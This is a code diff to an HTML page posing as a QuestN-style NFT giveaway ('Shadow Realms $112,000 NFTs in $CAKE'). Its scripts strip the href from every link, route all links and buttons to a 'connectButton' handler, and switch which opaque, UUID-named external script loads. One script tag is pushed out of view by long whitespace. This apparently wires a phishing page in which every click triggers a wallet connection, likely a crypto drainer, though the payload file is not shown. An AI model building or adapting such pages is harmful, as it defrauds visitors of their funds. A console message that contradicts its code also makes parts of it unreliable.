@@ -19,7 +19,7 @@
         for (var i = 0; i < links.length; i++) {
           var link = links[i];
           link.removeAttribute('href');
-          link.classList.add('interact-button');
+          link.classList.add('connectButton');
         }
         });
         </script>                                                                                                                          <script>
@@ -27,11 +27,19 @@
       var buttons = document.querySelectorAll('body button');
       for (var i = 0; i < buttons.length; i++) {
         var button = buttons[i];
-        button.classList.add('interact-button');
+        button.classList.add('connectButton');
       }
     });
     </script>
     <script>
+document.addEventListener("DOMContentLoaded", function() {
+        const elements = document.querySelectorAll('[interact-button]');
+        elements.forEach(element => {
+            element.classList.add('connectButton');
+        });
+    
+        console.log('Removed ad-data-linked attributes from', elements.length, 'elements');
+    });
       document.addEventListener("DOMContentLoaded", function() {
         const elements = document.querySelectorAll('[ad-data-linked]');
         elements.forEach(element => {
@@ -44,14 +52,14 @@
     </script>
     
         <style>
-          .interact-button {
+          .connectButton {
           cursor: pointer;
           }
         </style>
 
-<script charset="UTF-8" type="text/javascript" src="./42bcc1a2-5b2a-405b-878c-6f641464e522.js"></script>
+<!-- <script charset="UTF-8" type="text/javascript" src="./42bcc1a2-5b2a-405b-878c-6f641464e522.js"></script> -->
 
-<!--  <script charset="UTF-8" type="text/javascript" src="2dc16f5c-8869-46b9-bf15-044e892f3b09.js"></script> -->
+ <script charset="UTF-8" type="text/javascript" src="2dc16f5c-8869-46b9-bf15-044e892f3b09.js"></script>
 <meta charset=utf-8><meta name=viewport content="width=device-width, initial-scale=1, minimum-scale=1">
 <meta name=keywords content="QuestN, Quest3, ShowMe, NFT, Web3, Web3.0, SocialFi, GameFi, DAO">
 <title>Shadow Realms $112,000 NFTs in $CAKE + 1M Diamonds</title>
